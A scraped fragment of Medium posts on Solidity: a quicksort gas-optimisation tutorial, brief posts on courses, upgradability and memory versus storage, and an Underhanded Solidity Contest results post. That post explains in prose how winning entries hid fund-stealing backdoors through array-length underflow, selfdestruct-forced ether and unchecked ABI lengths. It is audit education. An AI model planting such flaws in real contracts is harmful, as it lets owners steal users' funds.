gas limit of 8 million. The minimum transaction requires 21,000 gas, so there\u2019s a ceiling of about ~380 contract calls per block, and each block is processed every 15 seconds on average. Since every contract operation costs gas (adding numbers, iterating over arrays, creating new contracts, transferring balances, etc) minimizing the gas used is critical to writing executable code on the Ethereum blockchain.Bad or inefficient code can kill your contract viability or bring the Ethereum network to its knees, for instance: The Inside Story of the CrytoKitties Congestion Crisis.As someone who\u2019s been programming in Solidity for a while now, I found the contest a refreshing way to rethink what I know and challenge a lot of assumptions. The first thing I focused on was the Sorting Integers problem, which will be the focus of this article.Setting UpEach challenge in the contest is contained in either a truffle project or an embark project. As a truffle user I\u2019ll be using the code provided here: https://github.com/Arachnid/sggc.If you\u2019re new to Solidity coding, there\u2019s an excellent guide to getting started with your first truffle project here: The Complete Tutorial On Getting Started With Smart Contracts On Ethereum.Once you complete the tutorial above you\u2019re ready to jump directly into working on these challenges.Challenge #1: Sorting\u00a0IntegersEach challenge in the golf contest is split into two components: Standard and Wild.The Standard challenge is just pure Solidity without any in-line bytecode. A Standard submission is automatically added to the Wild list as well, and contracts that execute the least amount of gas are the winners. Wild, as mentioned above, include EVM bytecode in areas that might be better tuned by hand and deep-knowledge rather than relying on the Solidity compiler.The first challenge is to take a list of n unsigned integers and sort them in ascending order. That\u2019s it! They might be in reverse order, random-order, or the list of integers may be empty: just return a sorted (or empty) array.The Contract: Sort.solThe initial contract provided contains an empty method called sort that has a single parameter input which is an array of unsigned integers, and the function is intended to return an array of unsigned integers.If you compile and run this right now in truffle (truffle compile; truffle test test/Sort.js) it\u2019ll issue the following error:/contracts/Sort.sol:21:19: Warning: Unused function parameter. Remove or comment out the variable name to silence this warning.function sort(uint[] input) public pure returns(uint[]) {^----------^In other words, it\u2019s expecting a returned uint[].The simplest first step is to simply return the incoming uint[] called input since that\u2019s the array we\u2019ll be operating on.Running the test suite now will show us a list of each of the (four) tests and how their results differ from the expected results.Now we have a good starting point to implement a sorting algorithm on the input variable.QuicksortThis article doesn\u2019t focus on \u201cthe best\u201d solution for the Integer Sorting problem; our goal is to just establish a known-good algorithm in an established language (Java), and highlight the techniques used to convert it into Solidity.For our purposes then let\u2019s implement Quicksort, an algorithm that mixes together efficiency with comprehensibility in a great ratio. In other words, it\u2019s easy to understand, easy to code, and is reasonably fast for average cases.For our purposes we\u2019re going to adapt the example implementation here: https://www.geeksforgeeks.org/quick-sort/This implementation uses two methods: a recursive sort() function and a partition() function. Quicksort chooses a \u201cpivot point\u201d and comparison sorts smaller and smaller partitions until the entire array is sorted.The beauty of this example is that it operates in-place on the existing array, so we don\u2019t need to create any new data-structures.Method StubsLet\u2019s begin by creating empty method stubs emulating the intention of the Java version.Java: void sort(int arr[], int low, int high) { ... }Solidity: function quickSort(uint[] arr, int low, int high) internal pure {}Java: int partition(int arr[], int low, int high) { ... }Solidity: function partition(uint[] arr, int low, int high) internal pure returns(int) {  return 0; // stub value}The intention of the Java sort() method is to operate in-place on the input array, and recursively calls itself on partitions of the array. It doesn\u2019t have any output: in Java this is denoted with the void keyword, but in Solidity you simply omit a list of return values.Two new keywords are introduced in the method signature: internal and pure. For the purposes of our algorithm we don\u2019t want this private/internal method to be called from anything but the originating contract\u2019s public method (also called sort()).Solidity supports polymorphism and all methods are virtual, so our new sort(uint[], int, int) method with the low and high integers will be called by the first sort(uint[]) method.The pure keyword denotes that this method (and by extension, other invoked methods) will NOT change the contract state in any way. No member fields are altered. No dynamic arrays in \u201cstorage\u201d are accessed. This is meant for methods executing math and math alone, only operating on the input and not the contract stored values.The intention of the partition() function is to find an optimal pivot point for the recursive sorting method to operate on the two new partitions. It returns an integer, and the only new addition is that the return type is specified in the tail-end of the method signature, not up-front like Java.Additionally, the return attribute is a list of values, and thus a function can assign multiple output values to multiple variables like so:(var1, var2, var3) = multiValueOutput();Since the function needs to return a value we put a stub return 0; as a temporary place-holder. This will be replaced shortly.Finally, to set us up to start testing our implementation, let\u2019s invoke the new sort function even if it doesn\u2019t do anything.The invocation of sort(uint[], int, int) in this case is expecting the boundaries for the partition we\u2019re sorting. To begin with, it\u2019s the entire array, so the low is 0 and the high is the number of elements minus one (the index of the last item in the array).Our implementation should look something like this:Why are we using bounds that are of type int if we\u2019re operating on an unsigned integer (uint) array? Does Solidity auto-cast int to uint for us if we\u2019re using array indexes?No. In fact, in the rest of the algorithm we\u2019ll have to explicitly cast int to uint when accessing elements in the array.Why not use uint then, besides the fact that the Java algorithm uses signed integers? Because of this: sort(arr, low, pi-1);Important Note: Prevent Underflow and\u00a0OverflowAny operation that does subtraction in Solidity on a uint has the possibility of underflowing. If the value is 0 and you subtract 1, what is the value now? It\u2019s not negative one. It\u2019s 2\u00b2\u2075\u2076-1. Is that number greater than 0? Yes. Therefore, if you have a loop counting on the number being greater than or equal to 0 it will ALWAYS be true.That\u2019s a great way to write a contract that consumes all its gas while it\u2019s desperately trying to decrement a value in an infinite loop.Let\u2019s keep this in the front of our thoughts as we adapt the Java example.sort(uint[] arr, int low, int\u00a0high)The Java example for this method is very short:void sort(int arr[], int low, int high) {  if (low < high) {    int pi = partition(arr, low, high);    sort(arr, low, pi-1);    sort(arr, pi+1, high);  }}Looking this over, nothing really stands out as Solidity specific besides the already implemented method signature. The difference here being that it\u2019s an unsigned integer array uint[] instead of integer.Solidity handles complex data-structures in a similar way to Java. There aren\u2019t any pointers, so an array of integers is passed by reference. The array arr[] is not a copy of input[]\u200a\u2014\u200ait is input[]; thus, any changes to arr[] in sort(uint[], int, int) are going to be passed out as the result of sort(uint[]).If we copy-paste the internals exactly and run our tests it will compile (with some warnings) and the test suite will generate stack overflows.Ethereum has a stack size limit of 1,024. And since our partition method is empty and our current sort methods keep recursively calling themselves without any exit conditions.We\u2019d better implement that partition function!partition(uint[] arr, int low, int\u00a0high)The partition function has a few jobs:Set an initial pivot point (this one chooses the highest value rather than the middle)Find the proper place for the pivot in the sorted array, and swap it for the value already thereReturn a new pivot pointNote: Quicksort algorithms vary in their implementation of pivots. As noted above this one chooses the highest element; the efficiency of this is dependent on the dataset being sorted.The Java implementation is as follows:int partition(int arr[], int low, int high) {  int pivot = arr[high];  int i = (low-1); // index of smaller element    for (int j=low; j<high; j++) {     // If current element is smaller than or    // equal to pivot    if (arr[j] <= pivot) {      i++;            // swap arr[i] and arr[j]      int temp = arr[i];      arr[i] = arr[j];      arr[j] = temp;    }  }    // swap arr[i+1] and arr[high] (or pivot)  int temp = arr[i+1];  arr[i+1] = arr[high];  arr[high] = temp;  return i+1;}Immediately we should remember the fact that we\u2019re using integers for the bounds instead of unsigned integers (required to access an array index in Solidity).We\u2019re going to have to cast those values at the time of array access (rather than convert them to uint at the start of the function) so we can keep doing integer math (with possible negative values) in the loop.Casting in Solidity is simple for these types uint(i) will do fine.The updated code will look like this:function partition(uint[] arr, int low, int high) internal pure returns(int) {  int pivot = int(arr[uint(high)]);  int i = (low-1); // index of smaller element  for (int j = low; j < high; j++) {    if (int(arr[uint(j)]) <= pivot) {      i++;      uint temp = arr[uint(i)];      arr[uint(i)] = arr[uint(j)];      arr[uint(j)] = temp;    }  }  uint temp2 = arr[uint(i+1)];  arr[uint(i+1)] = arr[uint(high)];  arr[uint(high)] = temp2;    return i+1;}We had to make several changes here:The pivot is an int so we had to access its position with a uint, then convert the uint to an intAll the array accesses have to be uintThe temporary variables used for swapping are uint because the array is uintDoes it compile? Yes! Let\u2019s run our test suite:It worked!As you can see the algorithm is correct and works fine, but is incredibly slow. It burned more than 7 million gas\u200a\u2014\u200aabout ~91% of one block\u2019s entire ability to run calculations. I even had to update the data/Sort.json to increase the simulated gas caps just to get it to finish the tests.SwappingEverything costs gas in Ethereum, even creating temp variables. Did you notice that I created a temp2 variable? Variables in a method have method-wide scope so I can\u2019t redeclare temp after the for loop.temp2 only exists for illustrative purposes, based on temp still persisting outside of the for loop I could\u2019ve just recycled it.But Solidity doesn\u2019t require you to use this nastiness. In the same way that method returns can be a list of values, we can assign multiple r-values to multiple l-values:// Java-ishuint temp = arr[uint(i)];arr[uint(i)] = arr[uint(j)];arr[uint(j)] = temp;// Solidity-ish(arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);Note the beautiful in-place swapping above. Is it just syntactic sugar or does it actually save us some gas?We\u2019ll do the same with the second part and re-run our test:(arr[uint(i+1)], arr[uint(high)]) = (arr[uint(high)], arr[uint(i+1)]);We saved 116,454 gas!That\u2019s still far too much gas to sort a couple hundred integers, but it demonstrates that Solidity language constructs do make a difference in the compiled bytecode and gas consumption. This is certainly a comment on the Solidity compiler itself lacking optimization cases for common swap techniques.Being Clever with XOR\u00a0SwapAs a further demonstration, since we\u2019re using unsigned integers, let\u2019s try this without the Solidity language construct or the temporary variable. Let\u2019s dust off the old XOR swap algorithm.// Solidity (clean)(arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);AND (arr[uint(i+1)], arr[uint(high)]) = (arr[uint(high)], arr[uint(i+1)]);BECOME// Solidity (XOR swap)arr[uint(i)] ^= arr[uint(j)];arr[uint(j)] ^= arr[uint(i)];arr[uint(i)] ^= arr[uint(j)];arr[uint(i+1)] ^= arr[uint(high)];arr[uint(high)] ^= arr[uint(i+1)];arr[uint(i+1)] ^= arr[uint(high)];There\u2019s a great proof of why this works in the Wikipedia article. With the utmost faith in mathematics let\u2019s run our new code that replaces the multi-value swap with XOR swaps.Well, that\u2019s not what we were expecting. Something is causing the method to spend all the gas (an infinite loop? hint: it\u2019s almost always an infinite loop).Reading the Wikipedia article very carefully we stumble upon this insight from their own C example:Note that the code does not swap the integers passed immediately, but first checks if their addresses are distinct. This is because, if the addresses are equal, the algorithm will fold to a triple *x ^= *x resulting in zero.Ah. i and j or i+1 and high might be the same address in the array. Let\u2019s avoid that edge case:if (i != j) {  arr[uint(i)] ^= arr[uint(j)];  arr[uint(j)] ^= arr[uint(i)];  arr[uint(i)] ^= arr[uint(j)];}if (i+1 != high) {  arr[uint(i+1)] ^= arr[uint(high)];  arr[uint(high)] ^= arr[uint(i+1)];  arr[uint(i+1)] ^= arr[uint(high)];}Re-run our test:Wow! We just saved another 2,823,204 gas by using XOR swapping with unsigned integers.Wikipedia specifically calls out avoiding the usage of XOR swapping these days because modern compilers can detect simple swaps that are safe to optimize like this, and do so: does the Solidity compiler not do this? (spoiler: the article\u2019s ending might surprise you!)Let\u2019s keep looking at ways to simplify and optimize this Solidity implementation.Method callsDo we really need two separate methods to handle recursion and partitioning? No.Do method calls cost gas? Yes.Therefore, we should do what we can to limit the number of method calls needed for the EVM. This is the opposite of conventional programming style in which large functions should be broken up into smaller functions for ease of maintenance.There\u2019s no hard and fast rule about this, obviously\u200a\u2014\u200adon\u2019t trust in black and white value judgments with code. In our case, with a code golf contest, and the fact that everything costs gas in the EVM, we want to limit the need for unnecessary things.If we can make the code understandable with comments, utilize a clean layout, and avoid nesting too deeply, then keeping invoked method counts low is the preference.Let\u2019s refactor the sort(uint[], int, int) method and integrate the contents of the partition function. To review, we\u2019re starting with:function sort(uint[] arr, int low, int high) internal pure {  if (low < high) {    int pi = partition(arr, low, high);    sort(arr, low, pi-1);    sort(arr, pi+1, high);  }}The line assigning the partition value is where we need to integrate the contents of the partition() method.All we really need to do here is update the variable names to be consistent:function sort(uint[] arr, int low, int high) internal pure {  if (low < high) {    int pivot = int(arr[uint(high)]);    int i = (low-1); // index of smaller element    for (int j = low; j < high; j++) {      if (int(arr[uint(j)]) <= pivot) {        i++;        if (i != j) {          arr[uint(i)] ^= arr[uint(j)];          arr[uint(j)] ^= arr[uint(i)];          arr[uint(i)] ^= arr[uint(j)];        }      }    }    if (i+1 != high) {      arr[uint(i+1)] ^= arr[uint(high)];      arr[uint(high)] ^= arr[uint(i+1)];      arr[uint(i+1)] ^= arr[uint(high)];    }    pivot = i + 1;    sort(arr, low, pivot-1);    sort(arr, pivot+1, high);  }}We\u2019ve updated the variable name pi to pivot and made sure the return value that partition() used to provide is accounted for in pivot = i + 1.Running the test again we receive a new gas cost of 4,367,460\u200a\u2014\u200aa savings of 21,460 gas. Nothing to write home about, but again a clear indication of the cost of internal method calls.Recurse Then Check, or Check Then\u00a0Recurse?One thing that might stand out to the reader is that every time our sorting algorithm runs we immediately check to see if low is less than high. This means in the worst case if its not we still invoked a method call cost just to get to that conditional checkpoint.Let\u2019s refactor it to do the check before calling further iterations of the sorting method.function sort(uint[] arr, int low, int high) internal pure {  int pivot = int(arr[uint(high)]);  int i = (low-1); // index of smaller element  for (int j = low; j < high; j++) {    if (int(arr[uint(j)]) <= pivot) {      i++;      if (i != j) {        arr[uint(i)] ^= arr[uint(j)];        arr[uint(j)] ^= arr[uint(i)];        arr[uint(i)] ^= arr[uint(j)];      }    }  }  if (i+1 != high) {    arr[uint(i+1)] ^= arr[uint(high)];    arr[uint(high)] ^= arr[uint(i+1)];    arr[uint(i+1)] ^= arr[uint(high)];  }  pivot = i + 1;  if (low < pivot-1) {    sort(arr, low, pivot-1);  }  if (pivot+1 < high) {    sort(arr, pivot+1, high);  }}The most important segment is at the bottom: we can\u2019t compare low to high anymore because we\u2019re trying to base the new recursion on the pivots. So if we\u2019re going to avoid always invoking a recursion in favor of checking beforehand we need to do two new conditional checks matching the input of the recursion calls.That\u2019s a lot of code and it might make you suspicious that it will cost more to do this than leaving it the old way.When we compile and test, however, we don\u2019t know: test vector 0 now fails.It turns out that test vector 0 is an empty array. Ah. We can\u2019t operate on an empty array!A minor update to the contract\u2019s public interface, the sort(uint[]) method can fix this:if (input.length >= 2) {  sort(input, 0, int(input.length - 1));}We don\u2019t need to sort an empty array or an array with only one element, right?Re-running out test yields a new gas cost of 4,345,785\u200a\u2014\u200aa new savings of 21,675 gas. It appears that even with all of our \u201cextra\u201d code we\u2019ve managed to use even less gas than before.Can We Avoid So Many\u00a0Casts?All over the place we\u2019re stuck using uint() and int() casts because we inherited a few subtraction operations from the Java example. Yet at no point are we ever subtracting more than 1 from the values. Can we refactor around this limitation?Let\u2019s start by just removing the casts and updating the indexing variables with unsigned integers. We\u2019ll have to update the method signatures and invocations as well:function sort(uint[] input) public pure returns(uint[]) {  if (input.length >= 2) {    sort(input, 0, input.length-1);  }  return input;  }function sort(uint[] arr, uint low, uint high) internal pure {  uint pivot = arr[high];  uint i = low - 1; // DANGER: Underflow?  for (uint j = low; j < high; j++) {    if (arr[j] <= pivot) {      i++;        if (i != j) {        arr[i] ^= arr[j];        arr[j] ^= arr[i];        arr[i] ^= arr[j];      }    }  }  if (i+1 != high) {    arr[i+1] ^= arr[high];    arr[high] ^= arr[i+1];    arr[i+1] ^= arr[high];  }  pivot = i + 1;  if (low < pivot-1) { // DANGER: Underflow?    sort(arr, low, pivot-1);  }  if (pivot+1 < high) {    sort(arr, pivot+1, high);  }}It does compile, but fails test vector 3: \u201cinvalid opcode.\u201d Is it accessing an non-existent array element? How can we account for the possible underflow error?One thought, again, is that we\u2019re only subtracting a single value of 1 from the numbers, so we could put a check on the actual underflowed value itself: 2\u00b2\u2075\u2076-1.Let\u2019s define a new class constant for the Sort contract:contract Sort {  uint constant UINT256_MAX = (2**256)-1;The idea here is that all uint are 256 bit unsigned integers (there are other packing types for integer values such as uint16 or uint192 if you so need them) and thus the max value is 2\u00b2\u2075\u2076-1. Since the max value of uint is zero minus one as well, we can use that as a sanity check value.Note: Unlike C with the limits.h library, there isn\u2019t a native UINT256_MAX constant already available in the Solidity language, as far as I know.Let\u2019s review the two possible danger spots:uint i = low - 1; // DANGER: Underflow?for (uint j = low; j < high; j++) {  if (arr[j] <= pivot) {    i++;    if (i != j) {      arr[i] ^= arr[j];      arr[j] ^= arr[i];      arr[i] ^= arr[j];    }  }}Even though low - 1 might be underflowed, all future operations increment it (to at least 0), and it\u2019s never used before the increment. This is fine, then.The next section is the conditional check before recursively calling the sorting method:if (low < pivot-1) { // DANGER: Underflow?  sort(arr, low, pivot-1);}Definitely a problem. If pivot is 0 then it\u2019ll absolutely underflow and the condition will always be true.The quick fix then is:if (pivot-1 != UINT256_MAX && low < pivot-1) { // Avoid underflow  sort(arr, low, pivot-1);}Now we just need to re-run our test: 4,363,648 gas. Wait. Did we just use 17,863 more gas than the version with all the castings just because we\u2019re having to do an additional conditional check?What if we split up the conditional check?if (pivot-1 != UINT256_MAX) {  if (low < pivot-1) { // DANGER: Underflow?    sort(arr, low, pivot-1);  }}That yields 4,361,398 gas, better, still worse than the casting version\u200a\u2014\u200abut did you notice that splitting up the conditional actually has an effect on gas cost?Solidity compiler: what manner of madness is this?!Meanwhile, some of you may be screaming back at the article: just compare with 0 then, if you\u2019re so worried about underflow!Ah. So you see the fatal flaw now? We over-complicated the situation without a real reason. We could much more easily say:if (pivot > 0 && low < pivot-1) {  sort(arr, low, pivot-1);}Gas cost with pivot > 0 instead of the UINT256_MAX check: 4,359,625.Splitting it up again:if (pivot > 0) {  if (low < pivot-1) {    sort(arr, low, pivot-1);  }}This final version costs 4,357,375 gas. This is still 11,590 gas more than the previous version using casts of uint and int.The peril of premature optimization: we need to look elsewhere, the casts are not the efficiency problem. We can\u2019t seem to avoid casts after all.Reviewing the AlgorithmWe\u2019re now stepping beyond the Java -> Solidity conversion questions and into the realm of \u201cwhat\u2019s the best way to use the Quicksort algorithm for these test cases.\u201dThe majority of this article has focused on a straightforward adaptation of an existing algorithm to Solidity from Java. We made an assumption that the original algorithm was a good Quicksort implementation.We made an assumption. Was it true?To review, this version uses the high value to set the pivot. What is that actually doing under the hood?If I have a set of integers like [5, 4, 6, 1, 2] then the iteration and transformations must look like this:low = 0, high = 4pivot = 2i = -1j = 0j is less than 4arr[j] is 55 is not less than or equal to 2 (pivot)j = 1j is less than 4arr[j] is 44 is not less than or equal to 2 (pivot)j = 2j is less than 4arr[j] is 66 is not less than or equal to 2 (pivot)j = 3arr[j] is 11 is less than 2 (pivot)i = 01 does not equal 3swap arr[i] and arr[j][1, 4, 6, 5, 2]j = 4i+1 = 11 does not equal 2swap arr[i+1] and arr[high][1, 2, 6, 5, 4]pivot = 1sort(arr, 0, 1)sort(arr, 2, 4)The impression I have there is than because we\u2019re always choosing high as the pivot, we\u2019re consistently going to have poor performance with the way it moves forward with huge second sorts and tiny, useless first sorts; it reminds me of Bubble Sort\u200a\u2014\u200anot great average case performance.From the\u00a0MiddleWe\u2019re not the only ones who\u2019ve ever asked ourselves how to write an efficient Quicksort in Solidity. In fact, there\u2019s an excellent version by Subhod I on Github that uses a middle pivot for Quicksort.Is his version faster than our pivot from the highest value? It sure looks clean.pragma solidity ^0.4.18;contract QuickSort {      function sort(uint[] data) public pure returns(uint[]) {    quickSort(data, int(0), int(data.length - 1));    return data;  }      function quickSort(uint[] memory arr, int left, int right) internal pure {    int i = left;    int j = right;    if(i==j) return;    uint pivot = arr[uint(left + (right - left) / 2)];    while (i <= j) {      while (arr[uint(i)] < pivot) i++;      while (pivot < arr[uint(j)]) j--;      if (i <= j) {        (arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);        i++;        j--;      }    }        if (left < j)      quickSort(arr, left, j);    if (i < right)      quickSort(arr, i, right);  }}Wow: 1,151,833 gas!Pivoting in the middle saved us 3,193,952 gas versus the naive Java -> Solidity implementation, even after our various optimizations!But look, the author of the snippet above is still using the in-place value swap construct (arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);.We proved earlier that the XOR swap was more efficient, right?Let\u2019s implement our special, optimized version of Subhod\u2019s algorithm then:Surely this one will be the\u00a0best!Total gas cost: 1,237,550.\u2026So it\u2019s worse by 85,717 gas. Our little trick that worked so well with the previous algorithm was completely useless (and worse!) in this already well-implemented version.Which was more important then, all of these attempts at optimizations, or checking our assumptions at the door and deciding on the right algorithm the first time?What Have We\u00a0LearnedHopefully we\u2019ve learned a few things:Some basic syntax differences between Java and SoliditySolidity method signatures and return valuesSimple gotchas and danger areas with indexes and boundariesAvoiding pre-mature optimizations, and focusing on algorithm choices firstDouble-checking assumptions: XOR shift and the Geeks for Geeks algorithm looked good on the surface, until we established a test case to compare againstThe Solidity compiler handles conditional checks differently than you might have expected (lower gas cost by nesting conditions)Avoiding casts isn\u2019t always necessaryMethod calls have a measurable costOver-complicated conditions (2\u00b2\u2075\u2076-1 instead of > 0) have a measurable costJust remember, look for established patterns first so you have benchmarks to compare against. And good luck golfing!", "responses": "4"}, {"title": "Ethereum and Solidity: The Complete Developer\u2019s Guide\u200a\u2014\u200aNew\u00a0Course!", "author_name": "Brandon Morelli", "link": "https://codeburst.io/ethereum-and-solidity-the-complete-developers-guide-new-course-2fb2d669cd9d?source=search_post", "post_date": "Jan 9, 2018", "readtime": "3 min read", "upvotes": "771", "content": "Ethereum and Solidity: The Complete Developer\u2019s Guide\u200a\u2014\u200aNew\u00a0Course!Use Ethereum, Solidity, and Smart Contracts to build production-ready apps based on the blockchainBrandon MorelliBlockedUnblockFollowFollowingJan 9, 2018A lot of you know that Stephen Grider is one of my favorite online instructors when it comes to learning Web Development. Well, he\u2019s just released a new course!Check out his course below that will teach you how to use Ethereum, Solidity, and Smart Contracts to build production-ready apps based on the blockchain!Disclosure: I write reviews and receive compensation from the companies whose products I review. I have experience with every course below, and I only recommend the best. All opinions expressed here are my own.", "responses": "1"}, {"title": "Upgradable Solidity Contract\u00a0Design", "author_name": "David Rugendyke", "link": "https://medium.com/rocket-pool/upgradable-solidity-contract-design-54789205276d?source=search_post", "post_date": "Nov 21, 2017", "readtime": "7 min read", "upvotes": "956", "content": "Upgradable Solidity Contract\u00a0DesignEternal Storage + Hub and Spoke Topology =\u00a0\u2665David RugendykeBlockedUnblockFollowFollowingNov 21, 2017Ethereum contracts are an amazing invention; autonomous immutable code that can act as judge, jury and executioner for a plethora of different services. Once deployed to the Ethereum blockchain though, they are essentially set in stone. This means if a serious bug or issue appears and your contracts aren\u2019t designed in a way that will allow them to be upgraded in your Dapp seamlessly, you might be glad you bought that 5 pack of brown underpants.", "responses": "11"}, {"title": "Ethereum Solidity: Memory vs Storage & How to initialize an array inside a\u00a0struct", "author_name": "Georgios Konstantopoulos", "link": "https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb?source=search_post", "post_date": "Feb 12, 2018", "readtime": "3 min read", "upvotes": "1.3K", "content": "Ethereum Solidity: Memory vs Storage & How to initialize an array inside a\u00a0structGeorgios KonstantopoulosBlockedUnblockFollowFollowingFeb 12, 2018In Loom Network\u2019s Telegram (which has ~8,000 members!) people ask questions on various topics such as Loom\u2019s roadmap, theoretical blockchain and Ethereum questions, and Solidity troubleshooting.There was a specific question that was asked, which involved initializing an array inside a struct. The person who asked it then provided their code, wondering why it does not work. I could not think of an answer of the top of my head so I decided to talk about this topic briefly in a post.The not-working code can be found below. I encourage you try finding a solution by yourself (you\u2019ve been practicing on CryptoZombies all this time, haven\u2019t you?).Read on to find the\u00a0answer.Wrong CodeIt should be noted that in the above fiddle, the keyword memory is needed when declaring the variable room. If it was declared as Room room, the compiler would return the following error:TypeError: Type struct StructArrayInitWrong.Room memory is not implicitly convertible to expected type struct StructArrayInitWrong.Room storage pointer.Some theoryA contract\u2019s storage variables are the ones which define your contract\u2019s state and are only changed by sendTransaction calls[1].memory variables are temporary variables that exist only inside the calling function (they cannot be declared outside of one). They get wiped after the function exits and they are generally cheaper to use than storage variables\u200a\u2014\u200amore details on gas costs here.Let\u2019s go through an example in order to understand how a storage variable can be used in a function in order to affect a contract\u2019s state.In the below fiddle, a copy of x gets passed in g() as and thus the state variable x will remain unmodified after execution (this is why we use the pure keyword.On the other hand, y in h() is declared as storage, which means that x is passed by reference. As a result, the state variable x is modified after the call to h().You can test the result by calling f() and then inspecting the value of y[2]. Even though g() is called after h(), it does not modify the state variable\u2019s value.Enough theorizing, let\u2019s get to the answer to the initial question.As we are unable to initialize the players array when initializing the structure, we are forced to do this in steps:Initialize the room structure to default values with an empty players array\u200a\u2014\u200aas described here and in this fiddle.Push the room to the rooms array.Push msg.sender to the last room\u2019s players array (rooms.length-1 always refers to the last element in an array).Working Code Fiddle below:getRoomPlayers added for debugging. Test succesful initialization with getRoomPlayers(0)The trick here is that new address[](0) allocates memory for an empty array of addresses. After the initialization, the room gets added to rooms and is now part of a storage variable. This allows us to operate on the array players and push values to it.Note: If we did a new uint[](8) we would get an array of 8 zeros. You can test it in this fiddle.That\u2019s all for today, hope we cleared some misunderstandings regarding storage/memory and how to use them in your functions. Let us know about your questions on our Telegram channel, and if they cannot be answered in a few messages we will dedicate a post on it (or maybe a CryptoZombies lesson!)", "responses": "3"}, {"title": "Announcing the winners of the first Underhanded Solidity Coding\u00a0Contest", "author_name": "Nick Johnson", "link": "https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079?source=search_post", "post_date": "Sep 20, 2017", "readtime": "5 min read", "upvotes": "1K", "content": "Announcing the winners of the first Underhanded Solidity Coding\u00a0ContestNick JohnsonBlockedUnblockFollowFollowingSep 20, 2017After much deliberation, the judgements are in, and we\u2019re finally able to announce the three winners of the first Underhanded Solidity Coding Contest. We received 23 qualifying entries in total, and the average quality was very high. Thanks again to everyone who submitted!All the submissions are now available on Github; note that the README in each contains spoilers provided by the author, so if you want to figure things out for yourself, be sure to read that last.Without any further ado, the winners:Honorable Mention: Doug\u00a0HoyteDoug\u2019s entry implements a fairly standard token funding contract, with a bug that lets the owner manipulate the contract\u2019s storage in unexpected ways.Feedback from the judges was that while the nature of the exploit was very clever, the bug that enabled it is fairly obvious to an auditor (though easily deniable as a simple mistake), and the \u2018unused\u2019 code looked suspicious. With some refinement of the way the bug was disguised, this could have been a truly devious entry.We have decided to award a fourth place prize to Doug; for his prize, he will receive 10 MLN tokens.Doug\u2019s writeup in the readme is comprehensive and well worth a read, going into great depth about the subtleties of Solidity and the EVM that enable the exploit.SPOILERSThe contract features a storage array whose length field can be decremented below 0. This causes an arithmetic overflow, effectively disabling Solidity\u2019s array bounds checking. As a result, after the overflow writes to the array can be used to overwrite any storage element located after the array\u200a\u2014\u200aincluding all mappings!Third Place: Jo\u00e3o\u00a0CarvalhoJo\u00e3o\u2019s entry implements a dutch auction crowdsale as a price discovery mechanism for selling tokens. Give the contract a look over if you\u2019d like to figure out the flaws yourself.For his prize, Jo\u00e3o received a ticket to DevCon 3. Thanks to the Ethereum Foundation for contributing this prize!SPOILERSAlthough the fallback function captures funds sent to the contract the regular way, the fallback isn\u2019t the only way to send funds to a contract. A selfdestruct by another contract can target the fallback, and result in sending funds without executing any code. This can cause the dutch auction to end early, artificially inflating the token price.Here\u2019s what the judges had to say about Jo\u00e3o\u2019s entry:YudiExternal update to the balance to manipulate price+ Clean, hard to trace back to the team- Fairly complexChrisThe submission exploits an often overlooked edge case in the EVM and is thus a good submission per se, but there are much shorter submissions for the same edge case where the problem is equally well \u201chidden\u201d.Matthewvery good\u200a\u2014\u200ai like the selfdestruct transfer technique, though ways that it can be used is restricted and requires somewhat unusual functionalitySecond Place: Richard\u00a0MooreRichard\u2019s entry implements a standard token contract with a small variation: the owner may only withdraw the raised funds gradually\u200a\u2014\u200a1 ether in the first week, 2 in the second, 4 in the third, and so forth. Stop here and give the contract a read yourself if you want to figure out where the deviousness lies.For his prize, Richard received a flight to Lyon and lunch with the iExec team. Thanks to iExec for sponsoring this prize!SPOILERSThe increasing schedule of payouts is accomplished by subtracting the remaining balance from the total supply of tokens. Since the fallback function always increases the total supply when it receives ether, this seems fine\u200a\u2014\u200aonly, the fallback function isn\u2019t the only way to fund a contract.As in Jo\u00e3o\u2019s entry, it\u2019s possible to send funds to a contract without running its fallback function, by selfdestructing another contract with the token contract as a target address. As demonstrated by Richard\u2019s tests, it\u2019s also possible to prefund the contract before deploying it. Once either of these has happened, the subtraction will cause an overflow, allowing the owner to withdraw as much as they want.Here\u2019s what the judges have to say about Richard\u2019s entry:YudiExternal update to the balance to underflow max withdrawal amount+ Short, clean, can be dismissed as a coder oversight- Overflow/Underflow issue is relatively easy to noticeChrisNice exploit of something that is not directly visible in the program, but code could be shorter.Matthewcute exploit, fixed by safemath but i like the trigger being funding it before the contract is deployedFirst Place: Martin\u00a0SwendeMartin\u2019s entry implements a \u2018round table\u2019 for governance, and raises funds by allowing people to bid on seats around the table. A \u2018small honorarium\u2019 is paid out to the creator of the contract for each bid. I highly recommend reading his code and trying to figure out for yourself where the flaw is.For his prize, Martin agreed to present his solution at DevCon 3 this November.SPOILERSThe \u2018small honorarium\u2019 sometimes turns out to be not quite so small. Martin makes use of the fact that Solidity does not validate that the ABI-encoded length of an array matches the length of the payload. He jumps through a couple of plausible-seeming hoops to avoid referencing the length directly when processing bids\u200a\u2014\u200aexcept when he increments the honorarium. As a result, the owner of the contract can submit a specially crafted bid that inflates the amount of the honorarium arbitrarily, and allows them to withdraw all the funds supplied by other users to their own account.Here\u2019s what the judges had to say about Martin\u2019s entry:YudiExploiting dynamic array length+ Short, clean, can be dismissed as a coder error, I like the theme\u00a0:)\u00a0- Seems a bit overly complex (no need for a loop), doesn\u2019t actually check msg.value against the bidsChristianBonus points for actually taking a look at compiled code.Suspicious that seats.length == bids.length is checked, but not seats.length == NO_OF_SEATS_BIDRelies on the fact that the ABI decoder does not check for overflows, but still: The actual problem is that bids.length is assumed to equal NO_OF_SEATS_BID but this assumption is not checked anywhere, the overflow only helps in executing the exploit.MatthewImpressive understanding of ABI and how solidity handles its own type structures, probably would not have caught the intention in an audit even though i may have caught the bug, also really like the fact that it allows the owner to act in a way where he may not even have to use the bugWrapping UpA huge thanks to everyone who submitted, and especially to our hardworking judges, who had to read and rate over 20 deliberately difficult to audit contracts. Look out for a new USCC, with a new theme, next year!", "responses": "4"}, {"title": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part\u00a02)", 